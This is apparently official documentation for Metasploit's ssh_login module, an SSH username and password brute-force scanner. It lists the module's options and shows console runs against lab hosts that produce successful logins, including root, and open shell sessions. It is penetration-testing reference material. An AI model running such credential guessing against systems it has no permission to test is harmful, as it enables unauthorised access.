## SSH Service

  SSH, Secure SHell, is an encrypted network protocol used to remotely interact with an Operating System at a command line level.  SSH is available on most every system, including Windows, but is mainly used by *nix administrators.
  This module attempts to login to SSH with username and password combinations.  For public/private SSH keys, please use `auxiliary/scanner/ssh/ssh_login_pubkey`.
  It should be noted that some modern Operating Systems have default configurations to not allow the `root` user to remotely login via SSH, or to only allow `root` to login with an SSH key login.

## Verification Steps

  1. Install SSH and start it.
  2. Start msfconsole
  3. Do: ` use auxiliary/scanner/ssh/ssh_login`
  4. Do: `set rhosts`
  5. Do: set usernames and passwords via any of the available options
  5. Do: `run`
  6. You will hopefully see something similar to, followed by a session:

  ```[+] SSH - Success: 'msfadmin:msfadmin' 'uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux '```

## Options

  **BLANK_PASSWORD**

  Boolean value on if an additional login attempt should be attempted with an empty password for every user.
  
  **PASSWORD**
  
  Password to try for each user.
  
  **PASS_FILE**
  
  A file containing a password on every line.  Kali linux example: `/usr/share/wordlists/metasploit/password.lst`

  **RHOSTS**
  
  Either a comma space (`, `) separated list of hosts, or a file containing list of hosts, one per line.  File Example: `file:/root/ssh_hosts.lst`, list example: `192.168.0.1` or `192.168.0.1, 192.168.0.2`

  **STOP_ON_SUCCESS**
  
  If a valid login is found on a host, immediately stop attempting additional logins on that host.

  **USERNAME**
  
  Username to try for each password.
  
  **USERPASS_FILE**
  
  A file containing a username and password, separated by a space, on every line.  An example line would be `username password`
  
  **USER_AS_PASS**
  
  Boolean value on if an additional login attempt should be attempted with the password as the username.
  
  **USER_FILE**
  
  A file containing a username on every line.

  **VERBOSE**
  
  Show a failed login attempt.  This can get rather verbose when large `USER_FILE`s or `PASS_FILE`s are used.  A failed attempt will look similar to the following:

  ```
  [-] SSH - Failed: 'msfadmin:virtual'
  ```

## Option Combinations

It is important to note that usernames and passwords can be entered in multiple combinations.  For instance, a password could be set in `PASSWORD`, be part of either `PASS_FILE` or `USERPASS_FILE`, be guessed via `USER_AS_PASS` or `BLANK_PASSWORDS`.
This module makes a combination of all of the above when attempting logins.  So if a password is set in `PASSWORD`, and a `PASS_FILE` is listed, passwords will be generated from BOTH of these.

## Scenarios

  Example run against:
  * Ubuntu 14.04 Server with root login permitted: 192.168.2.156
  * Ubuntu 16.04 Server: 192.168.2.137
  * Metasploitable: 192.168.2.46
  * Metasploitable 2: 192.168.2.35

```
msf > use auxiliary/scanner/ssh/ssh_login
msf auxiliary(ssh_login) > cat /root/ssh_passwords.lst
[*] exec: cat /root/ssh_passwords.lst

msfadmin
badpassword
root
ubuntu

msf auxiliary(ssh_login) > set pass_file /root/ssh_passwords.lst
pass_file => /root/ssh_passwords.lst
msf auxiliary(ssh_login) > cat /root/ssh_un.lst
[*] exec: cat /root/ssh_un.lst

msfadmin
badpassword
root
ubuntu

msf auxiliary(ssh_login) > set user_file /root/ssh_un.lst
user_file => /root/ssh_un.lst
msf auxiliary(ssh_login) > cat /root/ssh_hosts.lst
[*] exec: cat /root/ssh_hosts.lst

192.168.2.156
192.168.2.137
192.168.2.35
192.168.2.46
msf auxiliary(ssh_login) > set rhosts file:/root/ssh_hosts.lst
rhosts => file:/root/ssh_hosts.lst
msf auxiliary(ssh_login) > set verbose false
verbose => false
msf auxiliary(ssh_login) > set threads 4
threads => 4
msf auxiliary(ssh_login) > exploit

[*] SSH - Starting bruteforce
[*] SSH - Starting bruteforce
[*] SSH - Starting bruteforce
[*] SSH - Starting bruteforce
[+] SSH - Success: 'msfadmin:msfadmin' 'uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux '
[+] SSH - Success: 'msfadmin:msfadmin' 'uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux '
[*] Command shell session 5 opened (192.168.2.117:44415 -> 192.168.2.46:22) at 2017-02-22 20:26:13 -0500
[*] Command shell session 6 opened (192.168.2.117:36107 -> 192.168.2.35:22) at 2017-02-22 20:26:13 -0500
[+] SSH - Success: 'root:ubuntu' 'uid=0(root) gid=0(root) groups=0(root) Linux Ubuntu14 4.2.0-27-generic #32~14.04.1-Ubuntu SMP Fri Jan 22 15:32:26 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux '
[*] Command shell session 7 opened (192.168.2.117:32829 -> 192.168.2.156:22) at 2017-02-22 20:26:35 -0500
[+] SSH - Success: 'ubuntu:ubuntu' 'uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare) Linux Ubuntu14 4.2.0-27-generic #32~14.04.1-Ubuntu SMP Fri Jan 22 15:32:26 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux '
[*] Command shell session 8 opened (192.168.2.117:42205 -> 192.168.2.156:22) at 2017-02-22 20:26:42 -0500
[+] SSH - Success: 'ubuntu:ubuntu' 'uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare) Linux ubuntu 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux '
[*] Command shell session 9 opened (192.168.2.117:37027 -> 192.168.2.137:22) at 2017-02-22 20:26:44 -0500
[*] Scanned 3 of 4 hosts (75% complete)
[*] Scanned 4 of 4 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(ssh_login) > sessions -l

Active sessions
===============

  Id  Type          Information                              Connection
  --  ----          -----------                              ----------
  5   shell /linux  SSH msfadmin:msfadmin (192.168.2.46:22)  192.168.2.117:44415 -> 192.168.2.46:22 (192.168.2.46)
  6   shell /linux  SSH msfadmin:msfadmin (192.168.2.35:22)  192.168.2.117:36107 -> 192.168.2.35:22 (192.168.2.35)
  7   shell /linux  SSH root:ubuntu (192.168.2.156:22)       192.168.2.117:32829 -> 192.168.2.156:22 (192.168.2.156)
  8   shell /linux  SSH ubuntu:ubuntu (192.168.2.156:22)     192.168.2.117:42205 -> 192.168.2.156:22 (192.168.2.156)
  9   shell /linux  SSH ubuntu:ubuntu (192.168.2.137:22)     192.168.2.117:37027 -> 192.168.2.137:22 (192.168.2.137)
```

  Example run against:
  * Windows 10 w/ Linux Subsystem

```
msf > use auxiliary/scanner/ssh/ssh_login
msf auxiliary(ssh_login) > set rhosts 192.168.2.140
rhosts => 192.168.2.140
msf auxiliary(ssh_login) > set username winuser
username => winuser
msf auxiliary(ssh_login) > set password "badpassword"
password => badpassword
msf auxiliary(ssh_login) > exploit

[*] SSH - Starting bruteforce
[+] SSH - Success: 'winuser:badpassword' ''
[!] No active DB -- Credential data will not be saved!
[*] Command shell session 1 opened (192.168.2.117:42227 -> 192.168.2.140:22) at 2017-02-22 20:40:12 -0500
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(ssh_login) > sessions -l

Active sessions
===============

  Id  Type     Information                               Connection
  --  ----     -----------                               ----------
  1   shell /  SSH winuser:badpassword (192.168.2.140:22)  192.168.2.117:42227 -> 192.168.2.140:22 (192.168.2.140)

```

  Example run against:
  * Windows 10 w/ Bitvise SSH Server (WinSSHD) version 7.26-r2 and a virtual account created
  
  It is important to note here that the module gives back a **Success**, but then errors when trying to identify the remote system.
  This should be enough info to manually exploit via a regular SSH command.

```
msf > use auxiliary/scanner/ssh/ssh_login
msf auxiliary(ssh_login) > set rhosts 192.168.2.140
rhosts => 192.168.2.140
msf auxiliary(ssh_login) > set username virtual
username => virtual
msf auxiliary(ssh_login) > set password virtual
password => virtual
msf auxiliary(ssh_login) > exploit

[*] SSH - Starting bruteforce
[+] SSH - Success: 'virtual:virtual' 'id: Command not found.  help ?: Command not found.  '
[!] No active DB -- Credential data will not be saved!
[*] 192.168.2.140 - Command shell session 4 closed.  Reason: Died from EOFError
[*] Command shell session 4 opened (192.168.2.117:36169 -> 192.168.2.140:22) at 2017-02-22 21:20:24 -0500
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
